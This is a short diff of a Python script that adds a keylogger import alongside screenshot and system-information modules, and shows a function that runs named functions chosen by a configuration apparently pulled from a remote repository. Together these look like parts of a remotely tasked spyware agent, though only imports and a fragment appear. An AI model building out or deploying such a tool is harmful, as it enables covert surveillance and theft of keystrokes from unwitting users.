@@ -1,9 +1,10 @@
+from screenshot import screenshot
+from sysinfo import sysinfo
+from keylogger import keylogger
 import base64
 import json
 import requests
 from typing import Dict
-from screenshot import screenshot
-from sysinfo import sysinfo
 from dotenv import load_dotenv
 import os
 
@@ -42,4 +43,3 @@ def run_functions(repo_url: str, config_file: str):
             method()
         else:
             globals()[function_name]()
-
